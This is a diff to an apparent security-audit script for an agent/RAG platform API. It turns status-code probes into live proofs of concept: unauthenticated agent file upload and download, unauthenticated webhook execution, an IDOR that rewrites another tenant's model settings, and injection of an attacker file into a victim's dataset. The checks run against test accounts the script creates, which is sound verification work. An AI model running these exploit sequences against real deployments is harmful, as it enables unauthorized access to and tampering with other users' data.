@@ -13,6 +13,7 @@ import sys
 import time
 import base64
 import argparse
+from typing import Optional
 
 try:
     import requests
@@ -38,6 +39,72 @@ PASS = 0
 FAIL = 0
 RESULTS = []
 
+MINIMAL_AGENT_DSL = {
+    "components": {
+        "begin": {
+            "obj": {"component_name": "Begin", "params": {}},
+            "downstream": ["message"],
+            "upstream": [],
+        },
+        "message": {
+            "obj": {"component_name": "Message", "params": {"content": ["{sys.query}"]}},
+            "downstream": [],
+            "upstream": ["begin"],
+        },
+    },
+    "history": [],
+    "retrieval": [],
+    "path": [],
+    "globals": {
+        "sys.query": "",
+        "sys.user_id": "",
+        "sys.conversation_turns": 0,
+        "sys.files": [],
+    },
+    "variables": {},
+}
+
+
+def build_webhook_agent_dsl() -> dict:
+    """Build a minimal agent whose webhook executes synchronously."""
+    params = {
+        "mode": "Webhook",
+        "methods": ["POST"],
+        "security": {},
+        "content_types": "application/json",
+        "schema": {
+            "query": {"properties": {}, "required": []},
+            "headers": {"properties": {}, "required": []},
+            "body": {"properties": {}, "required": []},
+        },
+        "execution_mode": "Deferred",
+        "response": {},
+    }
+    return {
+        "components": {
+            "begin": {
+                "obj": {"component_name": "Begin", "params": params},
+                "downstream": ["message"],
+                "upstream": [],
+            },
+            "message": {
+                "obj": {"component_name": "Message", "params": {"content": ["webhook-ran"]}},
+                "downstream": [],
+                "upstream": ["begin"],
+            },
+        },
+        "history": [],
+        "retrieval": [],
+        "path": [],
+        "globals": {
+            "sys.query": "",
+            "sys.user_id": "",
+            "sys.conversation_turns": 0,
+            "sys.files": [],
+        },
+        "variables": {},
+    }
+
 
 def encrypt_password(password: str) -> str:
     """Encrypt password using the committed RSA public key (Finding 1)."""
@@ -57,6 +124,17 @@ def register_user(base_url: str, email: str, password: str) -> dict:
         timeout=30,
     )
     return resp.json()
+
+
+def register_and_login(base_url: str, prefix: str) -> tuple:
+    """Register a uniquely named user and return (session, user_data)."""
+    email = f"{prefix}-{int(time.time() * 1000)}@test.com"
+    password = "AuditTest123!"
+    reg = register_user(base_url, email, password)
+    if reg.get("code") != 0:
+        raise RuntimeError(f"Registration failed for {email}: {reg}")
+    session, user_data = login_user(base_url, email, password)
+    return session, user_data
 
 
 def login_user(base_url: str, email: str, password: str) -> tuple:
@@ -92,6 +170,54 @@ def login_user(base_url: str, email: str, password: str) -> tuple:
         raise RuntimeError("Auth verification failed — token rejected")
 
     return session, user_data
+
+
+def create_agent(session: requests.Session, base_url: str, title: str, dsl: dict) -> dict:
+    resp = session.post(
+        f"{base_url}/api/v1/agents",
+        json={"title": title, "dsl": dsl},
+        timeout=30,
+    )
+    data = resp.json()
+    if data.get("code") != 0:
+        raise RuntimeError(f"Agent creation failed: {data}")
+    return data["data"]
+
+
+def create_dataset(session: requests.Session, base_url: str, name: str) -> dict:
+    resp = session.post(f"{base_url}/api/v1/datasets", json={"name": name}, timeout=30)
+    data = resp.json()
+    if data.get("code") != 0:
+        raise RuntimeError(f"Dataset creation failed: {data}")
+    return data["data"]
+
+
+def upload_standalone_file(session: requests.Session, base_url: str, filename: str, content: bytes) -> dict:
+    resp = session.post(
+        f"{base_url}/api/v1/files",
+        files={"file": (filename, content)},
+        timeout=30,
+    )
+    data = resp.json()
+    if data.get("code") != 0:
+        raise RuntimeError(f"Standalone file upload failed: {data}")
+    return data["data"][0]
+
+
+def list_dataset_documents(session: requests.Session, base_url: str, dataset_id: str) -> dict:
+    resp = session.get(f"{base_url}/api/v1/datasets/{dataset_id}/documents", timeout=30)
+    data = resp.json()
+    if data.get("code") != 0:
+        raise RuntimeError(f"List dataset documents failed: {data}")
+    return data["data"]
+
+
+def get_models(session: requests.Session, base_url: str) -> dict:
+    resp = session.get(f"{base_url}/api/v1/users/me/models", timeout=30)
+    data = resp.json()
+    if data.get("code") != 0:
+        raise RuntimeError(f"Get models failed: {data}")
+    return data["data"]
 
 
 def record(finding_id: int, title: str, confirmed: bool, detail: str) -> None:
@@ -133,104 +259,195 @@ def test_finding_5(base_url: str) -> None:
            f"Protected /datasets -> code:{protected_code}, Unprotected /documents/images -> code:{image_code}")
 
 
-def test_finding_6(base_url: str) -> None:
-    """Finding 6: Unauthenticated agent file upload."""
-    r_protected = requests.get(f"{base_url}/api/v1/agents", timeout=10)
-    r_upload = requests.post(f"{base_url}/api/v1/agents/fake-id-000/upload", timeout=10)
+def test_finding_6_and_7(base_url: str, owner_session: requests.Session, owner_data: dict) -> None:
+    """Findings 6-7: create a real agent, upload without auth, then download without auth."""
+    try:
+        agent = create_agent(
+            owner_session,
+            base_url,
+            title=f"audit-upload-{int(time.time())}",
+            dsl=MINIMAL_AGENT_DSL,
+        )
+        payload = b"HELLO_FROM_UNAUTH"
+        r_upload = requests.post(
+            f"{base_url}/api/v1/agents/{agent['id']}/upload",
+            files={"file": ("hello.txt", payload)},
+            timeout=30,
+        )
+        upload_json = r_upload.json()
+        upload_data = upload_json.get("data", {}) if isinstance(upload_json.get("data"), dict) else {}
+        file_id = upload_data.get("id")
+        upload_ok = upload_json.get("code") == 0 and file_id and upload_data.get("created_by") == owner_data["id"]
+        record(
+            6,
+            "Unauth Agent Upload",
+            bool(upload_ok),
+            (
+                f"POST /agents/{agent['id']}/upload without auth -> code:{upload_json.get('code')}, "
+                f"created_by:{upload_data.get('created_by')}, file_id:{file_id}"
+            ),
+        )
 
-    p_code = r_protected.json().get("code", -1) if "json" in r_protected.headers.get("content-type", "") else -1
-    u_code = r_upload.json().get("code", -1) if "json" in r_upload.headers.get("content-type", "") else -1
+        if not upload_ok:
+            record(7, "Unauth Agent Download", False, "Upload step failed, download check skipped")
+            return
 
-    confirmed = (p_code == 401) and (u_code != 401)
-    record(6, "Unauth Agent Upload", confirmed,
-           f"Protected /agents -> code:{p_code}, Unprotected /agents/<id>/upload -> code:{u_code}")
-
-
-def test_finding_7(base_url: str) -> None:
-    """Finding 7: Unauthenticated agent file download."""
-    r_protected = requests.get(f"{base_url}/api/v1/agents", timeout=10)
-    r_download = requests.get(f"{base_url}/api/v1/agents/download?created_by=test&id=test", timeout=10)
-
-    p_code = r_protected.json().get("code", -1) if "json" in r_protected.headers.get("content-type", "") else -1
-    d_code = r_download.json().get("code", -1) if "json" in r_download.headers.get("content-type", "") else -1
-
-    confirmed = (p_code == 401) and (d_code != 401)
-    record(7, "Unauth Agent Download", confirmed,
-           f"Protected /agents -> code:{p_code}, Unprotected /agents/download -> code:{d_code}")
-
-
-def test_finding_13(base_url: str) -> None:
-    """Finding 13: Unauthenticated webhook execution."""
-    r_protected = requests.get(f"{base_url}/api/v1/agents", timeout=10)
-    r_webhook = requests.post(f"{base_url}/api/v1/agents/fake-id-000/webhook",
-                              json={"message": "test"}, timeout=10)
-
-    p_code = r_protected.json().get("code", -1) if "json" in r_protected.headers.get("content-type", "") else -1
-    w_code = r_webhook.json().get("code", -1) if "json" in r_webhook.headers.get("content-type", "") else -1
-
-    confirmed = (p_code == 401) and (w_code != 401)
-    record(13, "Unauth Webhook Execution", confirmed,
-           f"Protected /agents -> code:{p_code}, Unprotected /agents/<id>/webhook -> code:{w_code}")
+        r_download = requests.get(
+            f"{base_url}/api/v1/agents/download",
+            params={"created_by": owner_data["id"], "id": file_id},
+            timeout=30,
+        )
+        confirmed = r_download.status_code == 200 and r_download.content == payload
+        record(
+            7,
+            "Unauth Agent Download",
+            confirmed,
+            f"GET /agents/download without auth -> http:{r_download.status_code}, bytes:{len(r_download.content)}",
+        )
+    except Exception as e:
+        record(6, "Unauth Agent Upload", False, str(e))
+        record(7, "Unauth Agent Download", False, "Upload/download sequence aborted")
 
 
-def test_finding_15(base_url: str) -> None:
+def test_finding_13(base_url: str, owner_session: requests.Session) -> None:
+    """Finding 13: create a real webhook agent and invoke it without auth."""
+    try:
+        agent = create_agent(
+            owner_session,
+            base_url,
+            title=f"audit-webhook-{int(time.time())}",
+            dsl=build_webhook_agent_dsl(),
+        )
+        r = requests.post(
+            f"{base_url}/api/v1/agents/{agent['id']}/webhook/test",
+            json={"hello": "world"},
+            timeout=30,
+        )
+        detail = f"POST /agents/{agent['id']}/webhook/test without auth -> http:{r.status_code}, body:{r.text[:80]}"
+        confirmed = False
+        try:
+            body = r.json()
+            confirmed = r.status_code == 200 and body.get("message") == "webhook-ran" and body.get("success") is True
+        except Exception:
+            confirmed = False
+        record(13, "Unauth Webhook Execution", confirmed, detail)
+    except Exception as e:
+        record(13, "Unauth Webhook Execution", False, str(e))
+
+
+def test_finding_15(base_url: str, doc_id: Optional[str]) -> None:
     """Finding 15: Unauthenticated bulk thumbnail retrieval."""
     r_protected = requests.get(f"{base_url}/api/v1/datasets", timeout=10)
-    r_thumbnails = requests.get(f"{base_url}/api/v1/thumbnails?doc_ids=test-uuid", timeout=10)
+    target_doc = doc_id or "test-uuid"
+    r_thumbnails = requests.get(f"{base_url}/api/v1/thumbnails?doc_ids={target_doc}", timeout=10)
 
     p_code = r_protected.json().get("code", -1) if "json" in r_protected.headers.get("content-type", "") else -1
     t_code = r_thumbnails.json().get("code", -1) if "json" in r_thumbnails.headers.get("content-type", "") else -1
 
     confirmed = (p_code == 401) and (t_code != 401)
-    detail = f"Protected /datasets -> code:{p_code}, Unprotected /thumbnails -> code:{t_code}"
+    detail = f"Protected /datasets -> code:{p_code}, Unprotected /thumbnails({target_doc}) -> code:{t_code}"
     if t_code == 0:
         detail += " (returned success with no auth!)"
     record(15, "Unauth Bulk Thumbnails", confirmed, detail)
 
 
-def test_finding_16(base_url: str, session: requests.Session, user_data: dict) -> None:
-    """Finding 16: IDOR in tenant model configuration update."""
-    own_tenant = user_data["id"]
-    fake_tenant = "aaaa0000bbbb1111cccc2222dddd3333"
+def test_finding_16(
+    base_url: str,
+    attacker_session: requests.Session,
+    victim_session: requests.Session,
+    victim_data: dict,
+) -> None:
+    """Finding 16: mutate a real victim tenant and verify the victim sees the change."""
+    try:
+        before = get_models(victim_session, base_url)
+        unique_llm = f"audit-llm-{int(time.time())}"
+        unique_embd = f"audit-embd-{int(time.time())}"
+        r = attacker_session.patch(
+            f"{base_url}/api/v1/users/me/models",
+            json={
+                "tenant_id": victim_data["id"],
+                "llm_id": unique_llm,
+                "embd_id": unique_embd,
+                "asr_id": "audit-asr",
+                "img2txt_id": "audit-img",
+            },
+            timeout=30,
+        )
+        resp = r.json()
+        after = get_models(victim_session, base_url)
+        confirmed = (
+            resp.get("code") == 0
+            and after.get("tenant_id") == victim_data["id"]
+            and after.get("llm_id") == unique_llm
+            and after.get("embd_id") == unique_embd
+            and after.get("llm_id") != before.get("llm_id")
+        )
+        record(
+            16,
+            "IDOR Tenant Model Update",
+            confirmed,
+            (
+                f"attacker patched victim tenant {victim_data['id']} -> code:{resp.get('code')}, "
+                f"victim llm_id:{before.get('llm_id')}->{after.get('llm_id')}"
+            ),
+        )
+    except Exception as e:
+        record(16, "IDOR Tenant Model Update", False, str(e))
 
-    # Try to update a non-existent (fake) tenant — should succeed if IDOR exists
-    # (the server processes it without checking tenant ownership)
-    r = session.patch(
-        f"{base_url}/api/v1/users/me/models",
-        json={
-            "tenant_id": fake_tenant,
-            "llm_id": "attacker-model",
-            "embd_id": "attacker-embd",
-            "asr_id": "attacker-asr",
-            "img2txt_id": "attacker-img",
-        },
-        timeout=10,
-    )
-    resp = r.json()
-    # IDOR confirmed if request was processed (not blocked by auth/tenant check)
-    # Code 0 = success (tenant updated), code 100 = runtime error (e.g. model not found)
-    # Code 401/403 = auth blocked (IDOR would NOT be confirmed)
-    confirmed = resp.get("code") not in (401, 403, None)
-    record(16, "IDOR Tenant Model Update", confirmed,
-           f"PATCH /users/me/models with fake tenant_id -> code:{resp.get('code')}, msg:{resp.get('message', '')[:80]}")
 
+def test_finding_17(
+    base_url: str,
+    attacker_session: requests.Session,
+    attacker_data: dict,
+    victim_session: requests.Session,
+) -> Optional[str]:
+    """Finding 17: inject an attacker-owned file into a victim-owned dataset."""
+    try:
+        dataset = create_dataset(victim_session, base_url, f"victim-ds-{int(time.time())}")
+        before = list_dataset_documents(victim_session, base_url, dataset["id"])
+        attacker_file = upload_standalone_file(
+            attacker_session,
+            base_url,
+            "attacker.txt",
+            b"ATTACKER_CONTENT",
+        )
+        r = attacker_session.post(
+            f"{base_url}/api/v1/files/link-to-datasets",
+            json={"file_ids": [attacker_file["id"]], "kb_ids": [dataset["id"]]},
+            timeout=30,
+        )
+        resp = r.json()
 
-def test_finding_17(base_url: str, session: requests.Session, user_data: dict) -> None:
-    """Finding 17: Cross-tenant knowledge base document injection."""
-    fake_file_id = "aaaa0000bbbb1111cccc2222dddd3333"
-    fake_kb_id = "bbbb0000cccc1111dddd2222eeee3333"
+        doc_id = None
+        confirmed = False
+        for _ in range(10):
+            after = list_dataset_documents(victim_session, base_url, dataset["id"])
+            docs = after.get("docs", [])
+            injected = next((d for d in docs if d.get("location") == "attacker.txt"), None)
+            if injected:
+                doc_id = injected.get("id")
+                confirmed = (
+                    resp.get("code") == 0
+                    and injected.get("created_by") == attacker_data["id"]
+                    and injected.get("dataset_id") == dataset["id"]
+                    and after.get("total", 0) > before.get("total", 0)
+                )
+                break
+            time.sleep(0.5)
 
-    r = session.post(
-        f"{base_url}/api/v1/files/link-to-datasets",
-        json={"file_ids": [fake_file_id], "kb_ids": [fake_kb_id]},
-        timeout=10,
-    )
-    resp = r.json()
-    # Cross-tenant confirmed if request is processed (not blocked by auth/tenant check)
-    # With fake IDs, we expect "File not found" or "Can't find this dataset" — NOT a 401/403
-    confirmed = resp.get("code") not in (401, 403, None)
-    record(17, "Cross-Tenant KB Injection", confirmed,
-           f"POST /files/link-to-datasets with fake IDs -> code:{resp.get('code')}, msg:{resp.get('message', '')[:80]}")
+        record(
+            17,
+            "Cross-Tenant KB Injection",
+            confirmed,
+            (
+                f"attacker file {attacker_file['id']} linked into victim dataset {dataset['id']} -> "
+                f"code:{resp.get('code')}, injected_doc:{doc_id}"
+            ),
+        )
+        return doc_id
+    except Exception as e:
+        record(17, "Cross-Tenant KB Injection", False, str(e))
+        return None
 
 
 def main() -> None:
@@ -257,45 +474,50 @@ def main() -> None:
     print("[*] Testing Finding 1: RSA Key Compromise")
     test_finding_1(base_url)
 
-    # --- Register + Login for authenticated tests ---
-    print("[*] Registering test user...")
-    email = f"audit-{int(time.time())}@test.com"
-    password = "AuditTest123!"
+    # --- Register + Login for live object creation ---
+    print("[*] Registering live test users...")
     try:
-        reg = register_user(base_url, email, password)
-        if reg.get("code") != 0:
-            print(f"    Registration response: {reg}")
-            print("    Attempting login with existing user...")
+        owner_session, owner_data = register_and_login(base_url, "audit-owner")
+        attacker_session, attacker_data = register_and_login(base_url, "audit-attacker")
+        victim_session, victim_data = register_and_login(base_url, "audit-victim")
+        print(f"    Owner    : {owner_data['id']}")
+        print(f"    Attacker : {attacker_data['id']}")
+        print(f"    Victim   : {victim_data['id']}")
     except Exception as e:
-        print(f"    Registration error: {e}")
-
-    try:
-        session, user_data = login_user(base_url, email, password)
-        print(f"    Logged in as: {email} (tenant: {user_data['id']})")
-    except Exception as e:
-        print(f"[!] Login failed: {e}")
+        print(f"[!] User bootstrap failed: {e}")
         print("    Authenticated tests will be skipped.")
-        session = None
-        user_data = None
+        owner_session = None
+        owner_data = None
+        attacker_session = None
+        attacker_data = None
+        victim_session = None
+        victim_data = None
     print()
 
     # --- Unauthenticated endpoint tests ---
     print("[*] Testing unauthenticated endpoint findings...")
     test_finding_5(base_url)
-    test_finding_6(base_url)
-    test_finding_7(base_url)
-    test_finding_13(base_url)
-    test_finding_15(base_url)
+    if owner_session and owner_data:
+        test_finding_6_and_7(base_url, owner_session, owner_data)
+        test_finding_13(base_url, owner_session)
+    else:
+        print("[!] Skipping findings 6, 7, and 13 (no owner session)")
+        RESULTS.append((6, "Unauth Agent Upload", "SKIPPED", "No owner session"))
+        RESULTS.append((7, "Unauth Agent Download", "SKIPPED", "No owner session"))
+        RESULTS.append((13, "Unauth Webhook Execution", "SKIPPED", "No owner session"))
 
     # --- Authenticated IDOR/cross-tenant tests ---
-    if session and user_data:
+    doc_id = None
+    if attacker_session and attacker_data and victim_session and victim_data:
         print("[*] Testing authenticated IDOR/cross-tenant findings...")
-        test_finding_16(base_url, session, user_data)
-        test_finding_17(base_url, session, user_data)
+        doc_id = test_finding_17(base_url, attacker_session, attacker_data, victim_session)
+        test_finding_15(base_url, doc_id)
+        test_finding_16(base_url, attacker_session, victim_session, victim_data)
     else:
-        print("[!] Skipping authenticated tests (no session)")
-        RESULTS.append((16, "IDOR Tenant Model Update", "SKIPPED", "No auth session"))
-        RESULTS.append((17, "Cross-Tenant KB Injection", "SKIPPED", "No auth session"))
+        print("[!] Skipping findings 15, 16, and 17 (no attacker/victim sessions)")
+        test_finding_15(base_url, None)
+        RESULTS.append((16, "IDOR Tenant Model Update", "SKIPPED", "No attacker/victim sessions"))
+        RESULTS.append((17, "Cross-Tenant KB Injection", "SKIPPED", "No attacker/victim sessions"))
 
     # --- Summary ---
     print()
